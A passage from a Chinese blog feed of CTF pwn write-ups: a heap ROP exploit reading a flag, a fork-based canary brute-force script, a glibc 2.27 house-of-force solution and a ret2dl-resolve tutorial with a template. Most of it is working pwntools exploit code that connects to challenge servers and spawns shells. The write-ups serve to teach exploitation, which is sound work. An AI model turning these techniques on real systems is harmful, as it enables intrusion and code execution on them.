class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i+<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">17</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">17</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>,<span class="number">24</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">show(<span class="number">14</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x11c0</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">gadget_addr = libc_addr + <span class="number">0x0000000000151990</span></span><br><span class="line">add(<span class="number">24</span>,<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">25</span>,<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">26</span>,<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">27</span>,<span class="number">0x60</span>,p64(gadget_addr))</span><br><span class="line">chunk_addr = heap_addr  + <span class="number">0x1db0</span>-<span class="number">0xc0</span></span><br><span class="line">setcontext_addr = libc_addr + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">rdi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">rsi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>)))</span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x0000000000119211</span></span><br><span class="line">rsp_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rsp;ret&quot;</span>)))</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ret_addr = libc_addr + <span class="number">0x0000000000022679</span></span><br><span class="line">flag_addr = chunk_addr+<span class="number">0x10</span></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>+p64(chunk_addr+<span class="number">0x10</span>)+cyclic(<span class="number">0x10</span>)+p64(setcontext_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr+<span class="number">0x10</span>+<span class="number">0xa8</span>)+p64(ret_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">0</span>)+p64(rsi_addr)+p64(heap_addr+<span class="number">0x1df0</span>)+p64(rdx_addr)+p64(<span class="number">0x200</span>)+p64(<span class="number">0</span>)+p64(read_addr)<span class="comment">#+p64(rsp_addr)+p64(heap_addr+0x1000)</span></span><br><span class="line">add(<span class="number">28</span>,<span class="number">0x1d0</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">delete(<span class="number">28</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">3</span>) + p64(rsi_addr) + p64(flag_addr+<span class="number">0x100</span>) + p64(rdx_addr) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">1</span>) + p64(rsi_addr) + p64(flag_addr+<span class="number">0x100</span>) + p64(rdx_addr) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(write_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">flag = io.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h2><p>fork函数爆破canary 网上有相似的题目 直接用了爆破脚本 小改了一下 最后开了pie 还要再爆破16次 但是不知道为啥是概率通 很迷惑 多爆了了几次才出</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;39.105.26.155&quot;</span>,<span class="number">38646</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;welcome&quot;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line"></span><br><span class="line">        io.send(cyclic(<span class="number">0x68</span>) + canary +  i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        a = io.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;have fun&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line"></span><br><span class="line">            canary += i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x02&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x12&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x22&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x32&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x42&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x52&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x62&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x72&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x82&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x92&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\xa2&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\xb2&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\xc2&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\xd2&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\xe2&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\xf2&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023闽盾杯复赛</title>
      <link href="/2023/05/27/2023%E9%97%BD%E7%9B%BE%E6%9D%AF%E5%A4%8D%E8%B5%9B/"/>
      <url>/2023/05/27/2023%E9%97%BD%E7%9B%BE%E6%9D%AF%E5%A4%8D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>没有参加复赛 倒是开赛的时候别的师傅给了附件 做了做 最后是一血</p><p>一道2.27的堆 原题附件给的跟远程的不一样 坑死了 最后是用2.27 1.6的小版本打通的</p><p>代码审计一下 可以得知没有free chunk的机会 但是可以堆溢出覆盖nextchunk的size域 </p><p>这种情况首先想到了house of orange获得unsortedbin的手法 覆盖一下top chunk</p><p>随后我们就泄露出了libc地址</p><p>2.23跟2.27的最大差别就是多了tcachebin 在想下一步利用的时候 回想起了以前做过的一道house of force 可以申请到top chunk低地址处的chunk 利用这一点可以覆盖tcachebin结构体的entry指针数组 从而任意写 最后直接往malloc_hook里面写入onegadget就行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;39.104.26.167&quot;</span>,<span class="number">59599</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.27.so&quot;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0xd91</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1008</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">1632</span>-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">payload = cyclic(<span class="number">0x1008</span>)+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0xA54)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">add(<span class="number">3</span>,-<span class="number">0x22020</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x1000</span>)</span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">realloc_addr = libc_addr + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x40</span>)+p64(realloc_hook)+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)</span><br><span class="line">onegadget_addr = libc_addr +   <span class="number">0x4f302</span></span><br><span class="line">payload = p64(onegadget_addr)+p64(realloc_addr+<span class="number">10</span>)+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x100</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ret2dl</title>
      <link href="/2023/05/22/Ret2dl/"/>
      <url>/2023/05/22/Ret2dl/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一种基于延迟绑定机制的利用办法 适用于没有puts等输出函数的情况下 伪造结构体 使得任意函数的got表解析成system函数 从而getshell 应该算是pwn学习初期最早的伪造思想了 对于初期的学习还是不那么容易懂的 这个知识点我学的也比较晚 最早出现是刚学pwn没几个月的ISCTF 2022 那个时候做不出来 然后也没去复现 就一直拖到了现在 所以这篇文章的一些描述可能不是很详细 新学pwn的如果哪里看不懂 记得联系我 我删改一下</p><h2 id="利用本质"><a href="#利用本质" class="headerlink" title="利用本质"></a>利用本质</h2><h3 id="32位-Partical-RELRO"><a href="#32位-Partical-RELRO" class="headerlink" title="32位 Partical RELRO"></a>32位 Partical RELRO</h3><p>被我们熟知的plt表和got表 是因为延迟绑定机制的出现 这个机制主要是由于可以大幅度减少程序的体积 部分程序调用到的函数比较少 如果全部加载库 很容易就造成体积过大 所以出现了动态链接 </p><p>RELRO这个保护机制跟动态链接关系比较大 如果是FULL RELRO 那么就会在程序载入时就完成所有函数的got表解析    也就无从谈起利用</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305222228367.png" title="image-20230522222756256" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305222228367.png" alt="image-20230522222756256"></a></p><p>观察一下一个read函数的解析过程 在初次调用的时候 got表中指向的是plt表 把0入栈了 同时跳转到了0x8048380</p><p>同样入栈了一个参数 这个参数位于got表的第二个元素 我们在动态延迟绑定的文章说过 是模块的ID 随后跳转的地址是got表的第三个元素 同时是我们今天利用的关键 <code>_dl_runtime_resolve</code>函数的地址</p><p>下面就来详细分析一下这个函数是如何解析真实地址的</p><p>诸如io链中存在vtable这样的结构体 用来索引函数  _dl_runtime_resolve也有对应的结构体来索引各种表项 用来满足其寻找对应函数真实地址的需求</p><p>.dynamic段就是这样一个结构体 其存放了动态链接的几个关键表项.dynsym .dynstr .rela.plt等</p><p>_dl_runtime_resolve利用入栈的模块ID 这里又称为link_map 可以访问到dynamic段 从而获取其他表的地址</p><p>这里我们先不讲这几个表项的作用 跟着思路往下走</p><p>在_dl_runtime_resolve拿到表项地址以后 他怎么知道要寻找的是哪个函数的真实地址呢 或者说 小明妈妈让他买酱油 这个行为确实是触发了 但是小明不知道要买什么品牌的酱油</p><p>这个时候其会先寻找重定位表项 同样的 其仍然需要一个索引 否则他怎么知道要找哪个函数的重定位表项</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305232207052.png" title="image-20230523220740967" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305232207052.png" alt="image-20230523220740967"></a></p><p>而这个偏移 就是最开始入栈参数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305232209447.png" title="image-20230523220904423" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305232209447.png" alt="image-20230523220904423"></a></p><p>索引到重定位表项后  其就需要函数名 以此在so文件中寻找对应的真实地址 不过在索引dynstr到这个段获取字符串前 先需要到达dynsym段进行一个中转 而寻找到对应地址的偏移 就是上面的第二个参数</p><p>就拿我们上面的read的重定位表举例 第二个参数是0x107 这个值是怎么得到的呢</p><p>首先 7是固定的 可以理解为函数的标识 这个值可不能进行更改 在寻址过程中还会进行检查</p><p>前面的0x100是如何得到的呢  实际是由1&lt;&lt;8得到 这里的逻辑左移八位是固定的格式 _dl_runtime_resolve在读取到0x107后 会自动的逻辑右移 得到一个1</p><p>这个1乘以0x10 (这个值是dym结构体一个成员的大小) 就是dynsym表的偏移了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305232219595.png" title="image-20230523221915568" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305232219595.png" alt="image-20230523221915568"></a></p><p>我们来观察一下dynsym表的内容</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305232220146.png" title="image-20230523222010123" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305232220146.png" alt="image-20230523222010123"></a></p><p>除开0x804820c所对应的_gmon_start函数比较特殊之外 其余的sym表的第四个参数固定为0x12 这在后续中也存在检查</p><p>中间两个参数都是0 没啥可说的 来看一下第一个参数 这个参数就是用来索引dynstr表 直接对应的就是函数字符串存储地址减去dynstr的起始地址 </p><p>到此为止 _dl_runtime_resolve函数的调用流程就已经清晰了 稍微总结一下 索引的流程为:</p><p>压入link_map参数 索引dynamic段 根据压入的偏移参数寻址重定位表项</p><p>根据重定位表项寻址dynsym表 根据dynsym表索引dynstr表 最后获取到函数名</p><p>所以我们只要环环相扣 一步步伪造偏移 劫持索引流 就可以做到劫持read函数(任意函数都行) 将其真实地址的解析修改为system函数 就可以getshell</p><h2 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h2><h3 id="32位-Partical-RELRO-1"><a href="#32位-Partical-RELRO-1" class="headerlink" title="32位 Partical RELRO"></a>32位 Partical RELRO</h3><p>借助这样一个32位的程序来演示 程序的逻辑非常简单 就一个read 构成栈溢出 可以自行编译</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305232236361.png" title="image-20230523223618338" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305232236361.png" alt="image-20230523223618338"></a></p><p>由于我们需要伪造偏移 所以需要有一个可写可读的地址来存放我们的fake struct</p><p>理所当然的是bss段 于是这里直接构造read链 往bss段上读入数据</p><p>随后我们来想一下如何伪造偏移</p><p>上面提到 _dl_runtime_resolve解析dynamic段 需要靠压入的link_map参数 我们可以利用这个gadget来实现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.plt:08048380 sub_8048380     proc near               ; CODE XREF: .plt:0804839B↓j</span><br><span class="line">.plt:08048380                                         ; .plt:080483AB↓j ...</span><br><span class="line">.plt:08048380 ; __unwind &#123;</span><br><span class="line">.plt:08048380                 push    ds:dword_804A004</span><br><span class="line">.plt:08048386                 jmp     ds:dword_804A008</span><br><span class="line">.plt:08048386 sub_8048380     endp</span><br></pre></td></tr></table></figure><p>随后我们应该跟上用来索引重定位表项的偏移 这里的偏移就是fake_relplt_addr - relplt_addr</p><p>随后 我们需要伪造重定位表项 其第一个参数为想要误导的函数got表地址(哪怕是已经解析过真实地址的函数也可以 甚至是任意的可写地址都行 不过为了方便getshell 一般都是放到函数的got表里) 第二个参数用来索引dynsym表</p><p>第二个参数的伪造可以说是最关键的一步 因为dynsym其一个成员是0x10字节 同时还存在着对齐 所以要留意一下原本的dynsym起始地址的最后一位 比如我这个程序其最后一位是0xc 所以我伪造的dynsym的起始地址最后一位也应该为0xc</p><p>同时 fake_dynsym与dynsym的偏移 需要经过我上面提到的计算 最后的结果用来充当第二个参数</p><p>接着就是dynsym的伪造问题  一共有四个参数 后三个参数不用管  固定是 0，0，0x12</p><p>而第一个参数为fake_dynstr和dynstr的偏移 直接相减就行了</p><p>如果最后我们成功劫持了函数的解析 成功在read函数的got表中写入了system函数的真实地址  我们要如何getshell呢</p><p>我们知道 动态链接的最后 在得到了真实地址后 会重新调用一次该函数 所以 我们只需要重新调用函数时 rsp指针指向的第二个字长处(第一个字长为返回地址 拿垃圾数据填就行了)存放着binsh字符串地址即可</p><p>参考模板:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss(<span class="number">0x800</span>)</span><br><span class="line">fakesym_addr = bss_addr+<span class="number">0x1c</span></span><br><span class="line">name_addr = fakesym_addr+<span class="number">0x10</span>-dynstr</span><br><span class="line">fakesym = p32(name_addr)+p32(<span class="number">0</span>)*<span class="number">2</span>+p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="built_in">int</span>((fakesym_addr-dynsym)/<span class="number">0x10</span>)</span><br><span class="line">offset = offset&lt;&lt;<span class="number">8</span></span><br><span class="line">fake_relplt = p32(elf.got[<span class="string">&#x27;read&#x27;</span>])+p32(offset+<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">read_addr = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>+<span class="number">0x4</span>)+p32(read_addr)+p32(vuln_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x804854B&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">binsh_addr = bss_addr+<span class="number">0x80</span></span><br><span class="line">payload = p32(plt0)+p32(bss_addr+<span class="number">0x10</span>-rel_plt)</span><br><span class="line">payload += cyclic(<span class="number">0x4</span>)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">payload += fake_relplt</span><br><span class="line">payload += cyclic(<span class="number">0x4</span>)</span><br><span class="line">payload += fakesym</span><br><span class="line">payload += <span class="string">b&#x27;system\x00\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">leave_addr = <span class="number">0x08048448</span></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p32(bss_addr-<span class="number">0x4</span>)+p32(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>另类格式化字符串漏洞</title>
      <link href="/2023/05/21/%E5%8F%A6%E7%B1%BB%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
